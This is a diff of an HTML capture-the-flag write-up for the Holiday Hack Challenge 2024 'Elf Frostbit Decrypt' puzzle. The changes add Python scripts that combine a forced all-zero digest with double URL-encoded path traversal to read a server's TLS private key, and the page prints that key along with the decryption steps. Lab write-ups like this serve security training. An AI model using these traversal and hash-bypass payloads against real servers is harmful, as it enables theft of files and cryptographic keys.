@@ -27,19 +27,19 @@ Hints From Hint Dusty Giftwrap There’s a new ransomware spreading at the North
 Hints From Hint Dusty Giftwrap There’s a new ransomware spreading at the North Pole called Frostbit. Its infrastructure looks like code I worked on, but someone modified it to work with the ransomware. If it is our code and they didn’t disable dev mode, we might be able to pass extra options to reveal more information.">
     <meta itemprop="datePublished" content="2024-12-14T14:54:19+01:00">
     <meta itemprop="dateModified" content="2024-12-14T14:54:19+01:00">
-    <meta itemprop="wordCount" content="1579">
+    <meta itemprop="wordCount" content="1888">
     <title>Elf Frostbit Decrypt - HHC 2024</title>
-    <link href="/images/logo.png?1735213999" rel="icon" type="image/png">
-    <link href="/css/fontawesome-all.min.css?1735213999" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fontawesome-all.min.css?1735213999" rel="stylesheet"></noscript>
-    <link href="/css/nucleus.css?1735213999" rel="stylesheet">
-    <link href="/css/auto-complete.css?1735213999" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/auto-complete.css?1735213999" rel="stylesheet"></noscript>
-    <link href="/css/perfect-scrollbar.min.css?1735213999" rel="stylesheet">
-    <link href="/css/fonts.css?1735213999" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fonts.css?1735213999" rel="stylesheet"></noscript>
-    <link href="/css/theme.css?1735213999" rel="stylesheet">
-    <link href="/css/theme-christmas.css?1735213999" rel="stylesheet" id="R-variant-style">
-    <link href="/css/chroma-relearn-light.css?1735213999" rel="stylesheet" id="R-variant-chroma-style">
-    <link href="/css/print.css?1735213999" rel="stylesheet" media="print">
-    <script src="/js/variant.js?1735213999"></script>
+    <link href="/images/logo.png?1735218691" rel="icon" type="image/png">
+    <link href="/css/fontawesome-all.min.css?1735218691" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fontawesome-all.min.css?1735218691" rel="stylesheet"></noscript>
+    <link href="/css/nucleus.css?1735218691" rel="stylesheet">
+    <link href="/css/auto-complete.css?1735218691" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/auto-complete.css?1735218691" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar.min.css?1735218691" rel="stylesheet">
+    <link href="/css/fonts.css?1735218691" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fonts.css?1735218691" rel="stylesheet"></noscript>
+    <link href="/css/theme.css?1735218691" rel="stylesheet">
+    <link href="/css/theme-christmas.css?1735218691" rel="stylesheet" id="R-variant-style">
+    <link href="/css/chroma-relearn-light.css?1735218691" rel="stylesheet" id="R-variant-chroma-style">
+    <link href="/css/print.css?1735218691" rel="stylesheet" media="print">
+    <script src="/js/variant.js?1735218691"></script>
     <script>
       window.relearn = window.relearn || {};
       window.relearn.relBasePath='..\/..';
@@ -159,12 +159,12 @@ https://api.frostbit.app/api/v1/bot/15d977db-9fa9-48f8-be38-d36c2e21b12d/keyit</
 <h5 id="ransomware-note">Ransomware note</h5>
 <p>Visiting the urls found from the previous command, I found something interesting:</p>
 <div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>https://api.frostbit.app/view/Fgcse2IEk5zg3BhQhlL/15d977db-9fa9-48f8-be38-d36c2e21b12d/status?digest=0081c004828085c081a0e424db82a0a0</span></span></code></pre></div>
-<p><a href="#R-image-1f666c4e48e2e7a1574d0124308c68da" class="lightbox-link"><img alt="Ransomeware note" class="noborder lazy lightbox noshadow figure-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-1.png" style=" height: auto; width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-1f666c4e48e2e7a1574d0124308c68da"><img alt="Ransomeware note" class="noborder lazy lightbox noshadow lightbox-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-1.png"></a></p>
+<p><a href="#R-image-2f61138326168274abf1721989891d89" class="lightbox-link"><img alt="Ransomeware note" class="noborder lazy lightbox noshadow figure-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-1.png" style=" height: auto; width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-2f61138326168274abf1721989891d89"><img alt="Ransomeware note" class="noborder lazy lightbox noshadow lightbox-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-1.png"></a></p>
 <p>Links in screenshot verified to not be working. In addition, from the hints (or conversations) it was mentioned a certain debug mode, which can be enabled by adding a &ldquo;debug&rdquo; GET parameter equals to 1:</p>
 <div class="highlight wrap-code"><pre tabindex="0"><code>https://api.frostbit.app/view/Fgcse2IEk5zg3BhQhlL/15d977db-9fa9-48f8-be38-d36c2e21b12d/status?digest=0081c004828085c081a0e424db82a0a0&amp;debug=1</code></pre></div>
-<p><a href="#R-image-f8dc61df9dad60f03142fee5d632d4bd" class="lightbox-link"><img alt="Ransomeware note debug mode" class="noborder lazy lightbox noshadow figure-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-5.png" style=" height: auto; width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-f8dc61df9dad60f03142fee5d632d4bd"><img alt="Ransomeware note debug mode" class="noborder lazy lightbox noshadow lightbox-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-5.png"></a></p>
+<p><a href="#R-image-af6298098676272a43a866736d459541" class="lightbox-link"><img alt="Ransomeware note debug mode" class="noborder lazy lightbox noshadow figure-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-5.png" style=" height: auto; width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-af6298098676272a43a866736d459541"><img alt="Ransomeware note debug mode" class="noborder lazy lightbox noshadow lightbox-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-5.png"></a></p>
 <p>Toying with various parameters gives different results, in this case removing one character from the digest:</p>
 <div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;debug&#34;</span>: <span style="color:#66d9ef">true</span>,
@@ -255,8 +255,8 @@ SERVER_TRAFFIC_SECRET_0 b628d6ae5a2016185a918875556cb201006357548a301e914aaa9fe2
 </span></span><span style="display:flex;"><span>{&#34;digest&#34;:&#34;0081c004828085c081a0e424db82a0a0&#34;,&#34;status&#34;:&#34;Key Set&#34;,&#34;statusid&#34;:&#34;Fgcse2IEk5zg3BhQhlL&#34;}</span></span></code></pre></div>
 <h3 id="osint">OSINT</h3>
 <p>Dorking on Google I found:</p>
-<p><a href="#R-image-5aff0c4d05bc4a38ec7d8eebf3e52111" class="lightbox-link"><img alt="Ransomeware note" class="noborder lazy lightbox noshadow figure-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-2.png" style=" height: auto; width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-5aff0c4d05bc4a38ec7d8eebf3e52111"><img alt="Ransomeware note" class="noborder lazy lightbox noshadow lightbox-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-2.png"></a></p>
+<p><a href="#R-image-e24f26a0d37339e073a8bb78d405bf24" class="lightbox-link"><img alt="Ransomeware note" class="noborder lazy lightbox noshadow figure-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-2.png" style=" height: auto; width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-e24f26a0d37339e073a8bb78d405bf24"><img alt="Ransomeware note" class="noborder lazy lightbox noshadow lightbox-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-2.png"></a></p>
 <p>The content of the Python file is:</p>
 <div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> traceback
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> binascii
@@ -321,10 +321,10 @@ SERVER_TRAFFIC_SECRET_0 b628d6ae5a2016185a918875556cb201006357548a301e914aaa9fe2
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>, <span style="color:#66d9ef">None</span></span></span></code></pre></div>
 <h3 id="from-other-objectives">From other objectives</h3>
 <p>The Santa Vision objective had some references to Frostbit in the feeds:</p>
-<p><a href="#R-image-4d87ddd407dc3c914c0c745e92427835" class="lightbox-link"><img alt="Feed message 1" class="noborder lazy lightbox noshadow figure-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-3.png" style=" height: auto; width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-4d87ddd407dc3c914c0c745e92427835"><img alt="Feed message 1" class="noborder lazy lightbox noshadow lightbox-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-3.png"></a></p>
-<p><a href="#R-image-a1ddc7a65da6a1ebc3ea364550b9a1d8" class="lightbox-link"><img alt="Feed message 2" class="noborder lazy lightbox noshadow figure-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-4.png" style=" height: auto; width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-a1ddc7a65da6a1ebc3ea364550b9a1d8"><img alt="Feed message 2" class="noborder lazy lightbox noshadow lightbox-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-4.png"></a></p>
+<p><a href="#R-image-b6a8a9c5b1297b9752e87b7a461df30e" class="lightbox-link"><img alt="Feed message 1" class="noborder lazy lightbox noshadow figure-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-3.png" style=" height: auto; width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-b6a8a9c5b1297b9752e87b7a461df30e"><img alt="Feed message 1" class="noborder lazy lightbox noshadow lightbox-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-3.png"></a></p>
+<p><a href="#R-image-6b9737f4222e202a71eed5ffd7f6438f" class="lightbox-link"><img alt="Feed message 2" class="noborder lazy lightbox noshadow figure-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-4.png" style=" height: auto; width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-6b9737f4222e202a71eed5ffd7f6438f"><img alt="Feed message 2" class="noborder lazy lightbox noshadow lightbox-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-4.png"></a></p>
 <p>Appears this path might be important: <code>/etc/nginx/certs/api.frostbit.app.key</code></p>
 <h2 id="solution">Solution</h2>
 <p>This objective only has a Gold solution since there were no Silvers given (or available).</p>
@@ -351,8 +351,47 @@ SERVER_TRAFFIC_SECRET_0 b628d6ae5a2016185a918875556cb201006357548a301e914aaa9fe2
 </ol>
 <p>In essence, the function mixes the data in an inconsistent and potentially destructive way, which makes it unsuitable for generating unique, reliable hashes.</p>
 </blockquote>
-<p>By this took a closer look at the code and found out that computes an all zeroed hash if xrd == 0, meaning if <code>hash_result[count_mod]</code> is AND-ed with 0, then the outcome will be 0. It dawned upon me after talking on Discord that we are trying to retrie the &ldquo;/etc/nginx/certs/api.frostbit.app.key&rdquo; file.</p>
-<p>Thinking much over it, I came up with the following code:</p>
+<p>By closely examining the code, I discovered that it computes an all-zero hash when <code>xrd</code> equals 0. This occurs because if <code>hash_result[count_mod]</code> is AND-ed with 0, the result is always 0. To exploit this behavior, I crafted an HTTP GET query using an all-zero hex string as the digest (see the Python code below).</p>
+<p>Through a discussion on Discord, it became apparent that the objective was to retrieve the <code>/etc/nginx/certs/api.frostbit.app.key</code> file, confirming the encryption flaw.</p>
+<p>Identifying the correct path to the key file proved challenging. After extensive trial and error, I discovered that setting the digest attribute to all zeros allowed me to infer a relative path to the file based on the server’s response. By experimenting, I found that the endpoint returned &ldquo;Invalid Status Id or Digest&rdquo; when a file was successfully located. I leveraged this behavior in a brute-force script to determine the key file&rsquo;s relative path.</p>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib.parse
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>    url_base <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://api.frostbit.app/view/&#34;</span>
+</span></span><span style="display:flex;"><span>    url_path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/15d977db-9fa9-48f8-be38-d36c2e21b12d/status?debug=1&amp;digest=00000000000000000000000000000000&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    file_id <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;etc/nginx/certs/api.frostbit.app.key&#34;</span>
+</span></span><span style="display:flex;"><span>    relative_path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;../&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">brute</span>(filepath):
+</span></span><span style="display:flex;"><span>        navi <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>            navi <span style="color:#f92672">+=</span> relative_path
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote_plus(urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote_plus(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>navi<span style="color:#e6db74">}{</span>file_id<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>            url <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>url_base<span style="color:#e6db74">}{</span>payload<span style="color:#e6db74">}{</span>url_path<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            result <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url)
+</span></span><span style="display:flex;"><span>            data <span style="color:#f92672">=</span> result<span style="color:#f92672">.</span>json()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;error&#34;</span> <span style="color:#f92672">in</span> data<span style="color:#f92672">.</span>keys():
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> data[<span style="color:#e6db74">&#34;error&#34;</span>] <span style="color:#f92672">in</span> (<span style="color:#e6db74">&#34;Status Id Too Long&#34;</span>):
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> data[<span style="color:#e6db74">&#34;error&#34;</span>] <span style="color:#f92672">in</span> (<span style="color:#e6db74">&#34;Invalid Status Id or Digest&#34;</span>):
+</span></span><span style="display:flex;"><span>                    print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">Got something</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>                    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;JSON: </span><span style="color:#e6db74">{</span>data<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>                    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;URL : </span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Bruteforce to find the path</span>
+</span></span><span style="display:flex;"><span>    brute(file_id)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyboardInterrupt</span>:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Bye&#34;</span>)</span></span></code></pre></div>
+<p>The above Python code produces an URL which I utilized in the following script. Basically the script takes the known nonce, doubles it and prepares a payload which is then inserted in front of the relative file path. The hope is that the hashing algorithm will pick up the nonces and create an all zeroed hash internally. The theory behind it is that if you XOR and AND a nonce with itself, it&rsquo;ll create 0 as output.</p>
 <div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib.parse
 </span></span><span style="display:flex;"><span>
@@ -376,22 +415,28 @@ SERVER_TRAFFIC_SECRET_0 b628d6ae5a2016185a918875556cb201006357548a301e914aaa9fe2
 </span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xd7</span>,
 </span></span><span style="display:flex;"><span>])
 </span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Converting the nonce bytes list into properly formatted string string (if you look closely it is double urlencoded)</span>
 </span></span><span style="display:flex;"><span>nonce_string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;%25&#34;</span><span style="color:#f92672">.</span>join(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>byte<span style="color:#e6db74">:</span><span style="color:#e6db74">02x</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#66d9ef">for</span> byte <span style="color:#f92672">in</span> nonce)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Adding a separator at end of this strings</span>
 </span></span><span style="display:flex;"><span>separator <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote_plus(urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote_plus(<span style="color:#e6db74">&#34;/&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Crafting a payload</span>
 </span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;%25</span><span style="color:#e6db74">{</span>nonce_string<span style="color:#e6db74">}{</span>separator<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
 </span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Mergin it together</span>
 </span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;https://api.frostbit.app/view/</span><span style="color:#e6db74">{</span>payload<span style="color:#e6db74">}</span><span style="color:#e6db74">..%252F..%252F..%252F..%252F..%252Fetc%252Fnginx%252Fcerts%252Fapi.frostbit.app.key/15d977db-9fa9-48f8-be38-d36c2e21b12d/status?debug=1&amp;digest=00000000000000000000000000000000&#34;</span>
 </span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>print(url)
 </span></span><span style="display:flex;"><span>print(res<span style="color:#f92672">.</span>text)</span></span></code></pre></div>
-<p>To explain the code, let&rsquo;s take a first look at how the URL is built up:</p>
-<div class="highlight wrap-code"><pre tabindex="0"><code>https://api.frostbit.app/view/{PATH_A}/15d977db-9fa9-48f8-be38-d36c2e21b12d/status?debug=1&amp;digest=00000000000000000000000000000000&#34;</code></pre></div>
-<p>Which gave an URL</p>
+<p>The URL it generates follows this format:</p>
+<div class="highlight wrap-code"><pre tabindex="0"><code>https://api.frostbit.app/view/{nonce}{nonce}/{relative_path}/15d977db-9fa9-48f8-be38-d36c2e21b12d/status?debug=1&amp;digest=00000000000000000000000000000000&#34;</code></pre></div>
+<p>The <code>/{nonce}{nonce}/{relative_path}</code> is double url encoded since we must fool an internal filter. The output url will look like this:</p>
 <div class="highlight wrap-code"><pre tabindex="0"><code>https://api.frostbit.app/view/%25e9%2598%25a5%250d%2597%259e%25e2%25d7%25e9%2598%25a5%250d%2597%259e%25e2%25d7%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fnginx%252Fcerts%252Fapi.frostbit.app.key/15d977db-9fa9-48f8-be38-d36c2e21b12d/status?debug=1&amp;digest=00000000000000000000000000000000</code></pre></div>
-<p>Upon visiting it, it showed me:</p>
-<p><a href="#R-image-ebaba1abb5cb00c3a0eb3ba553666c1f" class="lightbox-link"><img alt="Feed message 6" class="noborder lazy lightbox noshadow figure-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-6.png" style=" height: auto; width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-ebaba1abb5cb00c3a0eb3ba553666c1f"><img alt="Feed message 6" class="noborder lazy lightbox noshadow lightbox-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-6.png"></a></p>
+<p>Upon visiting it, it revealed the private RSA key we were hunting for:</p>
+<p><a href="#R-image-0c305177f9bdde16584438740ea0b223" class="lightbox-link"><img alt="Feed message 6" class="noborder lazy lightbox noshadow figure-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-6.png" style=" height: auto; width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-0c305177f9bdde16584438740ea0b223"><img alt="Feed message 6" class="noborder lazy lightbox noshadow lightbox-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-6.png"></a></p>
 <p>The RSA PRIVATE KEY is:</p>
 <div class="highlight wrap-code"><pre tabindex="0"><code>-----BEGIN RSA PRIVATE KEY-----
 MIIJKAIBAAKCAgEAplg5eKDvk9f+gsWWZUtpFr80ojTZabm4Rty0Lorwtq5VJd37
@@ -444,7 +489,7 @@ p2PqLDVGeHDL2v0xcyvIthIve3/xGZgtBghfSyMPcqZ5s8h15m+/QNNd95zl7xqF
 yIHlLUXkLRxFZPPQZNwsACD8YoRPW/w60n2z7BzA5PcIZKNJlZqa9ixBunIxZXII
 jd6fDxOeVjU6usKzSeosoQCkEFvhlkVH6EK6Xfh6XDFatAnZyDNVP/PPihI=
 -----END RSA PRIVATE KEY-----</code></pre></div>
-<p>I quickly tested decrypted the encrypted CSV file, but it wasn&rsquo;t doable. However, I found something interesting earlier on in one of the JSON replies. Namely an encrypted key:</p>
+<p>At first I though I could use this to decrypt the CSV file - but no. It didn&rsquo;t work. However, I found something interesting earlier on in one of the JSON replies. Namely an encrypted key:</p>
 <div class="highlight wrap-code"><pre tabindex="0"><code>{&#34;encryptedkey&#34;:&#34;2ea5d786947ab4dbc462dc0d1fe878b07f46df032f17b43aeeedea7a2683996377d3b57cc2f94781deef9f81e966309e09e26577d5110836c4236b8dc3bec734ed0060168b30530b99d66cb4d33d9e87712dd71fb8ab6d311430b55743994400e9eb452a378a6c930225f69f46bdef91581a6325b4e873458d4fc9287a2f4af7bbc68a6f3db16b1e463982a815b2fc291b1013e880a2a8f077c1fed52a7673ec1bfc7a4bb6edba03ab670332fa3627f20116f6ceeed97a757bb220494cd696e8f5f05869b6f57f5aef18e204c7213d634b56fae8751b7521d86eb5f7d692313398ff70cded16d5eddef0ec655e7a5279d97a15d1c8efa8aac1c4b0073657007a96e34eeeaae9460629ae9ce5d219d512afef28736e6844f297c02e6cf992e36de5fdc8e0f79b71e92a3ecac6c1b703c84ecd7ca8deb52061441d0c30e3c8be30f3a8658be84a26bf7e7ce3d5b4637da157f7e87795fcfecc8411532ad0cc7c6a8a4de2861c2df429507f1909928cb735b4e3758c139b865e0b2ffceac950880219bdf644e6dca7545c03bff09194624a8fbb0ea54ee6ee3caf4749ca2165873b02e46548be0bbffea92cad7bd89606ed3f1f157d4fedc393007de842ab1e17e23f6fb4b4b963f328f1b55bf2fbe1ad57109a4a835308d6dfa0aaf98069bf44f0c8d50fe302205a82c181587d7fab4c1bf562109593a601f7b026e4236f71fc8f&#34;,&#34;nonce&#34;:&#34;e998a50d979ee2d7&#34;}</code></pre></div>
 <p>Whipping up a simple decoder script:</p>
 <div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo -n <span style="color:#e6db74">&#34;2ea5d786947ab4dbc462dc0d1fe878b07f46df032f17b43aeeedea7a2683996377d3b57cc2f94781deef9f81e966309e09e26577d5110836c4236b8dc3bec734ed0060168b30530b99d66cb4d33d9e87712dd71fb8ab6d311430b55743994400e9eb452a378a6c930225f69f46bdef91581a6325b4e873458d4fc9287a2f4af7bbc68a6f3db16b1e463982a815b2fc291b1013e880a2a8f077c1fed52a7673ec1bfc7a4bb6edba03ab670332fa3627f20116f6ceeed97a757bb220494cd696e8f5f05869b6f57f5aef18e204c7213d634b56fae8751b7521d86eb5f7d692313398ff70cded16d5eddef0ec655e7a5279d97a15d1c8efa8aac1c4b0073657007a96e34eeeaae9460629ae9ce5d219d512afef28736e6844f297c02e6cf992e36de5fdc8e0f79b71e92a3ecac6c1b703c84ecd7ca8deb52061441d0c30e3c8be30f3a8658be84a26bf7e7ce3d5b4637da157f7e87795fcfecc8411532ad0cc7c6a8a4de2861c2df429507f1909928cb735b4e3758c139b865e0b2ffceac950880219bdf644e6dca7545c03bff09194624a8fbb0ea54ee6ee3caf4749ca2165873b02e46548be0bbffea92cad7bd89606ed3f1f157d4fedc393007de842ab1e17e23f6fb4b4b963f328f1b55bf2fbe1ad57109a4a835308d6dfa0aaf98069bf44f0c8d50fe302205a82c181587d7fab4c1bf562109593a601f7b026e4236f71fc8f&#34;</span> | xxd -r -p &gt; encrypted_data.bin
@@ -452,9 +497,9 @@ jd6fDxOeVjU6usKzSeosoQCkEFvhlkVH6EK6Xfh6XDFatAnZyDNVP/PPihI=
 </span></span><span style="display:flex;"><span>openssl pkeyutl -decrypt -inkey key.pem -in encrypted_data.bin -out decrypted_data_1</span></span></code></pre></div>
 <p>With this script I got the following output:</p>
 <div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>52685b92ec2ae608c3fe1eedc3789953,e998a50d979ee2d7</span></span></code></pre></div>
-<p>Appears to be a Symmetric Key and IV Pair. Heading over to Cyberchef to solve it, as it appear to be AES based:</p>
-<p><a href="#R-image-eb800f35b20c788ae5c827c4a2510ade" class="lightbox-link"><img alt="Cyberched decode" class="noborder lazy lightbox noshadow figure-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-7.png" style=" height: auto; width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-eb800f35b20c788ae5c827c4a2510ade"><img alt="Cyberched decode" class="noborder lazy lightbox noshadow lightbox-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-7.png"></a></p>
+<p>It looks to be a Symmetric Key and IV Pair. Heading over to Cyberchef to solve it, as it appear to be AES based (grepped the provided artefacts for well known algorithms):</p>
+<p><a href="#R-image-fefc18899020cc58e77f3991110c8427" class="lightbox-link"><img alt="Cyberched decode" class="noborder lazy lightbox noshadow figure-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-7.png" style=" height: auto; width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-fefc18899020cc58e77f3991110c8427"><img alt="Cyberched decode" class="noborder lazy lightbox noshadow lightbox-image" loading="lazy" src="/images/act3/act3-frostbit-decrypt-7.png"></a></p>
 <p><strong>Answer:</strong> Xena Xtreme</p>
 
   <footer class="footline">
@@ -486,6 +531,7 @@ jd6fDxOeVjU6usKzSeosoQCkEFvhlkVH6EK6Xfh6XDFatAnZyDNVP/PPihI=
             <li class="" data-nav-id="/act3/santa-vision/index.html"><a class="padding" href="/act3/santa-vision/index.html">Santa Vision</a></li>
             <li class="active " data-nav-id="/act3/elf-frostbit-decrypt/index.html"><a class="padding" href="/act3/elf-frostbit-decrypt/index.html">Elf Frostbit Decrypt</a></li>
             <li class="" data-nav-id="/act3/elf-frostbit-deactivate/index.html"><a class="padding" href="/act3/elf-frostbit-deactivate/index.html">Elf Frostbit Deactivate</a></li></ul></li>
+            <li class="" data-nav-id="/closing/index.html"><a class="padding" href="/closing/index.html">Closing</a></li>
             <li class="" data-nav-id="/about/index.html"><a class="padding" href="/about/index.html">About</a></li>
           </ul>
         </div>
@@ -540,22 +586,22 @@ jd6fDxOeVjU6usKzSeosoQCkEFvhlkVH6EK6Xfh6XDFatAnZyDNVP/PPihI=
         </div>
       </div>
     </aside>
-    <script src="/js/clipboard.min.js?1735213999" defer></script>
-    <script src="/js/perfect-scrollbar.min.js?1735213999" defer></script>
-    <script src="/js/d3/d3-color.min.js?1735213999" defer></script>
-    <script src="/js/d3/d3-dispatch.min.js?1735213999" defer></script>
-    <script src="/js/d3/d3-drag.min.js?1735213999" defer></script>
